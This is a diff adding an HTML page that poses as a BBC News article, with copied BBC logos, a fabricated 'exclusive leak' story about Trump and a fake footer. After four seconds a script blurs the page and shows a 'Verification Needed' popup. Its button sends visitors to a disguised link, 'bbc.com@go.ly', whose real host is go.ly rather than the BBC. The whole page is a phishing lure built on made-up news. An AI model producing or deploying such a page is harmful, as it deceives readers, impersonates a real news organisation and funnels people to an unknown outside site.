@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>BBC Themed Page</title>
+  <link rel="icon" type="image/png" href="https://d1yei2z3i6k35z.cloudfront.net/8323771/67a6e8cd5eae0_bbcfavicon.png">
+  <link rel="apple-touch-icon" href="https://d1yei2z3i6k35z.cloudfront.net/8323771/67a6e8cd5eae0_bbcfavicon.png">
+  <!-- Google Font for Popup (Roboto) -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    /* Global Styles: White background and Black text */
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      color: #000;
+    }
+    /* Header Container for Alignment */
+    .header-container {
+      max-width: 800px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 0;
+    }
+    /* Header Styles */
+    header {
+      background-color: #fff;
+      padding: 0 20px;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+    }
+    /* Adjust SVG logo size */
+    .logo svg {
+      height: 32px;
+      width: auto;
+    }
+    nav ul {
+      list-style: none;
+      margin: 0;
+      padding: 0;
+      display: flex;
+    }
+    nav ul li {
+      margin: 0 10px;
+    }
+    nav ul li a {
+      text-decoration: none;
+      color: #000;
+      font-weight: bold;
+    }
+    .search-container {
+      display: flex;
+      align-items: center;
+    }
+    .search-container input[type="text"] {
+      padding: 5px;
+      border: none;
+      border-radius: 3px;
+    }
+    .search-container button {
+      padding: 5px 10px;
+      margin-left: 5px;
+      border: none;
+      border-radius: 3px;
+      background-color: #fff;
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    /* Separator (Horizontal Bar) */
+    .separator {
+      border: none;
+      border-top: 1px solid #000;
+      margin: 20px auto;
+      max-width: 800px;
+    }
+    /* Main Content Wrapper */
+    #main-content {
+      transition: filter 0.3s ease;
+    }
+    .blurred {
+      filter: blur(5px);
+    }
+    /* BBC Exclusive Section Styles */
+    .container {
+      max-width: 800px;
+      margin: 20px auto;
+      text-align: center;
+      padding: 20px;
+    }
+    .title {
+      font-size: 2rem;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+    .subtitle {
+      font-size: 1.2rem;
+      font-weight: normal;
+      margin-bottom: 20px;
+    }
+    .metadata {
+      text-align: left;
+      font-size: 0.8rem;
+      color: grey;
+      margin-bottom: 10px;
+    }
+    .metadata p {
+      margin: 5px 0;
+    }
+    /* News Content */
+    .news-content {
+      text-align: left;
+    }
+    .news-content p {
+      margin-bottom: 15px;
+      line-height: 1.6;
+    }
+    /* News Image */
+    .news-image {
+      width: 600px;
+      display: block;
+      margin: 20px auto;
+    }
+    /* Footer Styles */
+    .footer {
+      background-color: #fff;
+      color: #000;
+      padding: 20px 0;
+    }
+    .footer-container {
+      display: flex;
+      justify-content: space-around;
+      flex-wrap: wrap;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 0 20px;
+    }
+    .footer-column {
+      flex: 1;
+      min-width: 200px;
+      margin: 10px;
+    }
+    .footer-column h3 {
+      border-bottom: 2px solid #000;
+      padding-bottom: 10px;
+    }
+    .footer-column ul {
+      list-style: none;
+      padding: 0;
+    }
+    .footer-column ul li {
+      margin: 10px 0;
+    }
+    .footer-column ul li a {
+      color: #000;
+      text-decoration: none;
+    }
+    .footer-column ul li a:hover {
+      text-decoration: underline;
+    }
+    .footer-logo {
+      text-align: center;
+      margin: 20px 0;
+    }
+    .footer-logo img {
+      width: 100px;
+    }
+    .footer-bottom {
+      background-color: #fff;
+      color: #000;
+      text-align: center;
+      padding: 10px 0;
+      font-size: 0.9rem;
+    }
+    .footer-bottom a {
+      color: #000;
+      text-decoration: none;
+    }
+    .footer-bottom a:hover {
+      text-decoration: underline;
+    }
+    /* --------------------------------------------------------
+       POPUP OVERLAY + BOX
+    -------------------------------------------------------- */
+    #popup-overlay {
+      display: none; /* Shown via JS after 4 seconds */
+      position: fixed;
+      top: 0; 
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.5);
+      z-index: 9999;
+    }
+    .popup-box {
+      background-color: #000;
+      color: #fff;
+      width: 600px; /* Increased size */
+      max-width: 90%;
+      margin: 100px auto; /* Centered horizontally */
+      padding: 20px;
+      border-radius: 4px;
+      text-align: center;
+      font-family: 'Roboto', sans-serif;
+    }
+    .popup-logo svg {
+      width: 80px;
+      height: auto;
+      display: block;
+      margin: 0 auto 15px;
+    }
+    .popup-box h2 {
+      margin: 10px 0;
+      font-size: 28px;
+    }
+    .popup-box p {
+      text-align: left;
+      line-height: 1.5;
+      font-size: 16px;
+      margin: 15px 0;
+    }
+    .popup-buttons button {
+      background-color: #007bff;
+      border: none;
+      color: #fff;
+      padding: 10px 20px;
+      margin: 20px 0;
+      width: 100%;
+      font-size: 18px;
+      cursor: pointer;
+      border-radius: 4px;
+    }
+    .popup-links p {
+      margin-top: 10px;
+      font-size: 16px;
+    }
+    .popup-links a {
+      color: #007bff;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Header Section -->
+  <header>
+    <div class="header-container">
+      <div class="logo">
+        <!-- Original BBC Logo SVG -->
+        <div class="sc-d6c9e5b8-2 jvZnqG" bis_skin_checked="1">
+          <div data-testid="anchor-inner-wrapper" bis_skin_checked="1">
+            <a href="/" data-testid="internal-link" class="sc-2e6baa30-0 gILusN">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 112 32" category="logo" icon="bbc" class="sc-735e4804-0 itfIsL">
+                <title>British Broadcasting Corporation</title>
+                <path d="M111.99999,4.44444577e-05 L111.99999,32.0000444 L79.9999905,32.0000444 L79.9999905,4.44444577e-05 L111.99999,4.44444577e-05 Z M72.0000119,-3.55271368e-15 L72.0000119,32 L40.0000119,32 L40.0000119,-3.55271368e-15 L72.0000119,-3.55271368e-15 Z M32,-3.55271368e-15 L32,32 L-1.13686838e-13,32 L-1.13686838e-13,-3.55271368e-15 L32,-3.55271368e-15 Z M97.469329,6.80826869 C96.0294397,6.80826869 94.7294393,7.02226876 93.5693278,7.44982444 C92.4089942,7.87782457 91.4137717,8.49471364 90.5841047,9.30049166 C89.7538823,10.1067141 89.1188821,11.07327 88.6785486,12.199937 C88.2378818,13.3269373 88.0177706,14.5896043 88.0177706,15.9876048 C88.0177706,17.4188274 88.2296596,18.7062722 88.6531042,19.8493837 C89.0763265,20.9929396 89.6861045,21.9591621 90.482438,22.748829 C91.2784383,23.5383848 92.2522163,24.1430516 93.4042167,24.5624962 C94.5558837,24.9819408 95.8516619,25.1917186 97.2914401,25.1917186 C98.3752182,25.1917186 99.4086629,25.072163 100.391219,24.8338296 C101.37333,24.5956073 102.237108,24.2706072 102.982664,23.8592738 L102.982664,23.8592738 L102.982664,20.4292727 C101.40733,21.4001619 99.6881074,21.8851621 97.8251069,21.8851621 C96.6054399,21.8851621 95.567884,21.6549398 94.7126615,21.194273 C93.8572168,20.7338284 93.2049944,20.0633837 92.7564387,19.1831613 C92.3073275,18.3032721 92.0831052,17.2380496 92.0831052,15.9876048 C92.0831052,14.7377155 92.3156608,13.6766041 92.7816609,12.8044927 C93.2474389,11.9327147 93.916328,11.2664922 94.7888838,10.8058254 C95.6609951,10.3453809 96.715551,10.1148252 97.9521069,10.1148252 C98.8496628,10.1148252 99.7052186,10.2342697 100.518108,10.4726031 C101.331219,10.7112699 102.084664,11.0609366 102.779442,11.5212701 L102.779442,11.5212701 L102.779442,8.01738016 C102.017219,7.62260227 101.191441,7.32260218 100.302219,7.11671323 C99.4129963,6.91126872 98.4685515,6.80826869 97.469329,6.80826869 Z M55.7552388,7.00000208 L49.0000146,7.00000208 L49.0000146,25.0000021 L56.1713501,25.0000021 C57.590906,25.0000021 58.8063508,24.7903407 59.8181289,24.3706739 C60.8297959,23.9513405 61.6087961,23.3553403 62.1555741,22.5832289 C62.7020187,21.8114509 62.9754632,20.8882284 62.9754632,19.8140059 C62.9754632,18.7232278 62.6941298,17.7960053 62.1312407,17.0321162 C61.5681294,16.2686715 60.7563514,15.7104491 59.6957955,15.3580046 C60.4625736,14.9891156 61.0420182,14.4894488 61.4335738,13.8601152 C61.8252406,13.2307817 62.0210185,12.4881148 62.0210185,11.6321146 C62.0210185,10.1385586 61.4742405,8.99311379 60.3812402,8.19578022 C59.2877954,7.39889109 57.745795,7.00000208 55.7552388,7.00000208 L55.7552388,7.00000208 Z M15.7552269,7.00000208 L9.00000268,7.00000208 L9.00000268,25.0000021 L16.1713381,25.0000021 C17.5908941,25.0000021 18.8062278,24.7903407 19.8182281,24.3706739 C20.8296729,23.9513405 21.6087842,23.3553403 22.1555621,22.5832289 C22.7021179,21.8114509 22.9755624,20.8882284 22.9755624,19.8140059 C22.9755624,18.7232278 22.6941179,17.7960053 22.1311177,17.0321162 C21.5682286,16.2686715 20.7563395,15.7104491 19.6957836,15.3580046 C20.4625616,14.9891156 21.0418952,14.4894488 21.4335619,13.8601152 C21.8252287,13.2307817 22.0210066,12.4881148 22.0210066,11.6321146 C22.0210066,10.1385586 21.4741175,8.99311379 20.3811172,8.19578022 C19.2877835,7.39889109 17.7457831,7.00000208 15.7552269,7.00000208 L15.7552269,7.00000208 Z M55.8775833,17.2209385 C58.1128062,17.2209385 59.2308065,18.0434943 59.2308065,19.6881614 C59.2308065,20.4602728 58.9369175,21.0518285 58.3496951,21.4629397 C57.7622505,21.8743843 56.9216947,22.0797177 55.8286944,22.0797177 L55.8286944,22.0797177 L52.6469157,22.0797177 L52.6469157,17.2209385 Z M15.8775714,17.2209385 C18.1129054,17.2209385 19.2307946,18.0434943 19.2307946,19.6881614 C19.2307946,20.4602728 18.9370167,21.0518285 18.3496832,21.4629397 C17.7622386,21.8743843 16.9216828,22.0797177 15.8286825,22.0797177 L15.8286825,22.0797177 L12.6469038,22.0797177 L12.6469038,17.2209385 Z M55.412572,9.92028073 C57.3541282,9.92028073 58.3252396,10.6338365 58.3252396,12.0600591 C58.3252396,12.7988371 58.0763506,13.373504 57.5786838,13.7846152 C57.0807948,14.1960598 56.3587946,14.4013932 55.412572,14.4013932 L55.412572,14.4013932 L52.6469046,14.4013932 L52.6469046,9.92028073 Z M15.4125601,9.92028073 C17.3541163,9.92028073 18.3252277,10.6338365 18.3252277,12.0600591 C18.3252277,12.7988371 18.0762276,13.373504 17.5786719,13.7846152 C17.0807829,14.1960598 16.3587826,14.4013932 15.4125601,14.4013932 L15.4125601,14.4013932 L12.6468927,14.4013932 L12.6468927,9.92028073 Z"></path>
+              </svg>
+            </a>
+          </div>
+        </div>
+      </div>
+      <nav>
+      
+  <!-- charset and other tags here… -->
+  <!-- 1) Tell mobile browsers to set the viewport width to device-width -->
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 2) Basic responsive CSS -->
+  <style>
+    /* Make every element include its padding/border in its width */
+    *, *::before, *::after {
+      box-sizing: border-box;
+    }
+
+    /* Ensure the page never exceeds the screen width */
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      overflow-x: hidden;
+    }
+
+    /* A fluid “container” class you can wrap your content in */
+    .container {
+      width: 100%;
+      max-width: 1200px;    /* adjust to your desktop max */
+      margin: 0 auto;
+      padding: 0 15px;      /* gutter on small screens */
+    }
+
+    /* Make images, videos, iframes scale down to fit */
+    img, video, iframe {
+      max-width: 100%;
+      height: auto;
+      display: block;
+    }
+
+    /* Example: turn any .row with flex columns into stacked on mobile */
+    @media (max-width: 768px) {
+      .row {
+        display: flex;
+        flex-direction: column;
+      }
+    }
+  </style>
+
+        <ul>
+          <li><a href="/">Home</a></li>
+          <li><a href="/news">News</a></li>
+          <li><a href="/sport">Sport</a></li>
+          <li><a href="/weather">Business</a></li>
+          <li><a href="/iplayer">Innovations</a></li>
+          <li><a href="/iplayer">Live</a></li>
+        </ul>
+      </nav>
+      <div class="search-container">
+        <input type="text" placeholder="Search">
+        <button type="submit">Go</button>
+      </div>
+    </div>
+  </header>
+  
+  <!-- Main Content Wrapper (to be blurred) -->
+  <div id="main-content">
+    <!-- Horizontal bar between header and content -->
+    <hr class="separator">
+    <!-- BBC Exclusive Section -->
+    <div class="container">
+      <h1 class="title">Unfiltered Report: What They Won't Tell You About Trump!</h1>
+      <p class="subtitle">Trump's Darkest Secrets, The Leaks That Terrified Washington.</p>
+      <div class="metadata">
+        <p>11 hours ago</p>
+        <p>Exclusive Leak | BBC Investigative Unit | Reporting from Washington D.C.</p>
+      </div>
+      <!-- New Image -->
+      <img src="https://cdnuploads.aa.com.tr/uploads/Contents/2025/02/22/thumbs_b_c_5be5aaa5aa5ad7e753161c59dc6b29e3.jpg?v=080455" alt="Trump" class="news-image">
+      <div class="news-content">
+        <p>
+          A shocking classified chat between top U.S. officials has just been exposed by anonymous hackers. The contents are so sensitive that major institutions are scrambling to keep the details hidden. Only a few insiders have access to these explosive revelations.
+        </p>
+        <p>
+          As the controversy deepens, experts warn that this leak could change the political landscape forever. With unprecedented pressure mounting, the full details remain locked behind strict security measures.
+        </p>
+        <p>
+          <a href="" style="color: #000; text-decoration: underline;">Read more...</a>
+        </p>
+      </div>
+    </div>
+    <!-- Horizontal bar between content and footer -->
+    <hr class="separator">
+  </div>
+  
+  <!-- Footer Section -->
+  <footer class="footer">
+    <div class="footer-container">
+      <div class="footer-column">
+        <h3>About BBC News</h3>
+        <ul>
+          <li><a href="#">Overview</a></li>
+          <li><a href="#">Editorial Team</a></li>
+          <li><a href="#">Careers</a></li>
+          <li><a href="#">Contact Us</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Sections</h3>
+        <ul>
+          <li><a href="#">World</a></li>
+          <li><a href="#">Business</a></li>
+          <li><a href="#">Politics</a></li>
+          <li><a href="#">Health</a></li>
+          <li><a href="#">Science &amp; Environment</a></li>
+          <li><a href="#">Entertainment &amp; Arts</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Features</h3>
+        <ul>
+          <li><a href="#">BBC News App</a></li>
+          <li><a href="#">Newsletters</a></li>
+          <li><a href="#">BBC World Service</a></li>
+          <li><a href="#">BBC News Magazine</a></li>
+        </ul>
+      </div>
+      <div class="footer-column">
+        <h3>Follow Us</h3>
+        <ul>
+          <li><a href="#">Facebook</a></li>
+          <li><a href="#">Twitter</a></li>
+          <li><a href="#">Instagram</a></li>
+          <li><a href="#">YouTube</a></li>
+        </ul>
+      </div>
+    </div>
+    <div class="footer-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/BBC_News_2022.svg" alt="BBC News Logo">
+    </div>
+    <div class="footer-bottom">
+      <p>© 2025 BBC. The BBC is not responsible for the content of external sites. <a href="#">Read about our approach to external linking.</a></p>
+    </div>
+  </footer>
+  
+  <!-- POPUP OVERLAY + BOX -->
+  <div id="popup-overlay">
+    <div class="popup-box">
+      <div class="popup-logo">
+        <svg viewBox="0 0 112 32" category="logo" icon="bbc">
+          <title>BBC</title>
+          <path d="M111.99999,4.44444577e-05 L111.99999,32.0000444 L79.9999905,32.0000444 L79.9999905,4.44444577e-05 L111.99999,4.44444577e-05 Z M72.0000119,-3.55271368e-15 L72.0000119,32 L40.0000119,32 L40.0000119,-3.55271368e-15 L72.0000119,-3.55271368e-15 Z M32,-3.55271368e-15 L32,32 L-1.13686838e-13,32 L-1.13686838e-13,-3.55271368e-15 L32,-3.55271368e-15 Z M97.469329,6.80826869 C96.0294397,6.80826869 94.7294393,7.02226876 93.5693278,7.44982444 C92.4089942,7.87782457 91.4137717,8.49471364 90.5841047,9.30049166 C89.7538823,10.1067141 89.1188821,11.07327 88.6785486,12.199937 C88.2378818,13.3269373 88.0177706,14.5896043 88.0177706,15.9876048 C88.0177706,17.4188274 88.2296596,18.7062722 88.6531042,19.8493837 C89.0763265,20.9929396 89.6861045,21.9591621 90.482438,22.748829 C91.2784383,23.5383848 92.2522163,24.1430516 93.4042167,24.5624962 C94.5558837,24.9819408 95.8516619,25.1917186 97.2914401,25.1917186 C98.3752182,25.1917186 99.4086629,25.072163 100.391219,24.8338296 C101.37333,24.5956073 102.237108,24.2706072 102.982664,23.8592738 L102.982664,23.8592738 L102.982664,20.4292727 C101.40733,21.4001619 99.6881074,21.8851621 97.8251069,21.8851621 C96.6054399,21.8851621 95.567884,21.6549398 94.7126615,21.194273 C93.8572168,20.7338284 93.2049944,20.0633837 92.7564387,19.1831613 C92.3073275,18.3032721 92.0831052,17.2380496 92.0831052,15.9876048 C92.0831052,14.7377155 92.3156608,13.6766041 92.7816609,12.8044927 C93.2474389,11.9327147 93.916328,11.2664922 94.7888838,10.8058254 C95.6609951,10.3453809 96.715551,10.1148252 97.9521069,10.1148252 C98.8496628,10.1148252 99.7052186,10.2342697 100.518108,10.4726031 C101.331219,10.7112699 102.084664,11.0609366 102.779442,11.5212701 L102.779442,11.5212701 L102.779442,8.01738016 C102.017219,7.62260227 101.191441,7.32260218 100.302219,7.11671323 C99.4129963,6.91126872 98.4685515,6.80826869 97.469329,6.80826869 Z M55.7552388,7.00000208 L49.0000146,7.00000208 L49.0000146,25.0000021 L56.1713501,25.0000021 C57.590906,25.0000021 58.8063508,24.7903407 59.8181289,24.3706739 C60.8297959,23.9513405 61.6087961,23.3553403 62.1555741,22.5832289 C62.7020187,21.8114509 62.9754632,20.8882284 62.9754632,19.8140059 C62.9754632,18.7232278 62.6941298,17.7960053 62.1312407,17.0321162 C61.5681294,16.2686715 60.7563514,15.7104491 59.6957955,15.3580046 C60.4625736,14.9891156 61.0420182,14.4894488 61.4335738,13.8601152 C61.8252406,13.2307817 62.0210185,12.4881148 62.0210185,11.6321146 C62.0210185,10.1385586 61.4742405,8.99311379 60.3812402,8.19578022 C59.2877954,7.39889109 57.745795,7.00000208 55.7552388,7.00000208 L55.7552388,7.00000208 Z M15.7552269,7.00000208 L9.00000268,7.00000208 L9.00000268,25.0000021 L16.1713381,25.0000021 C17.5908941,25.0000021 18.8062278,24.7903407 19.8182281,24.3706739 C20.8296729,23.9513405 21.6087842,23.3553403 22.1555621,22.5832289 C22.7021179,21.8114509 22.9755624,20.8882284 22.9755624,19.8140059 C22.9755624,18.7232278 22.6941179,17.7960053 22.1311177,17.0321162 C21.5682286,16.2686715 20.7563395,15.7104491 19.6957836,15.3580046 C20.4625616,14.9891156 21.0418952,14.4894488 21.4335619,13.8601152 C21.8252287,13.2307817 22.0210066,12.4881148 22.0210066,11.6321146 C22.0210066,10.1385586 21.4741175,8.99311379 20.3811172,8.19578022 C19.2877835,7.39889109 17.7457831,7.00000208 15.7552269,7.00000208 L15.7552269,7.00000208 Z M55.8775833,17.2209385 C58.1128062,17.2209385 59.2308065,18.0434943 59.2308065,19.6881614 C59.2308065,20.4602728 58.9369175,21.0518285 58.3496951,21.4629397 C57.7622505,21.8743843 56.9216947,22.0797177 55.8286944,22.0797177 L55.8286944,22.0797177 L52.6469157,22.0797177 L52.6469157,17.2209385 Z M15.8775714,17.2209385 C18.1129054,17.2209385 19.2307946,18.0434943 19.2307946,19.6881614 C19.2307946,20.4602728 18.9370167,21.0518285 18.3496832,21.4629397 C17.7622386,21.8743843 16.9216828,22.0797177 15.8286825,22.0797177 L15.8286825,22.0797177 L12.6469038,22.0797177 L12.6469038,17.2209385 Z M55.412572,9.92028073 C57.3541282,9.92028073 58.3252396,10.6338365 58.3252396,12.0600591 C58.3252396,12.7988371 58.0763506,13.373504 57.5786838,13.7846152 C57.0807948,14.1960598 56.3587946,14.4013932 55.412572,14.4013932 L55.412572,14.4013932 L52.6469046,14.4013932 L52.6469046,9.92028073 Z M15.4125601,9.92028073 C17.3541163,9.92028073 18.3252277,10.6338365 18.3252277,12.0600591 C18.3252277,12.7988371 18.0762276,13.373504 17.5786719,13.7846152 C17.0807829,14.1960598 16.3587826,14.4013932 15.4125601,14.4013932 L15.4125601,14.4013932 L12.6468927,14.4013932 L12.6468927,9.92028073 Z"></path>
+        </svg>
+      </div>
+      <h2>Verification Needed</h2>
+      <p>
+        This exclusive report is restricted to verified users only. To maintain the integrity and privacy of the information, access is granted after quick verification. Click the button below to proceed..
+      </p>
+
+<div style="text-align:center; margin-top: 20px;">
+  <button onclick="window.location.href='https://www.bbc.com@go.ly/news-trendingnews-article-6732954-world-usa-canada-2025-politics-global-affairs-diplomacy-economy-latest-breaking-news-live-updates-analysis-exclusive-report-67329854'" 
+          style="background-color:#007BFF; color:white; border:none; padding:12px 24px; font-size:16px; border-radius:6px; cursor:pointer;">
+    Please register to see
+  </button>
+</div>
+
+
+
+      <div class="popup-links">
+        <p>Already have an account?<br><a href="#">Sign in</a></p>
+      </div>
+    </div>
+  </div>
+  
+  <!-- JavaScript to show popup after 4 seconds and blur main content -->
+  <script>
+  // Show popup after 4 seconds
+  setTimeout(function () {
+    document.getElementById('popup-overlay').style.display = 'block';
+    document.getElementById('main-content').classList.add('blurred');
+  }, 4000);
+</script>
+</body>
+</html>
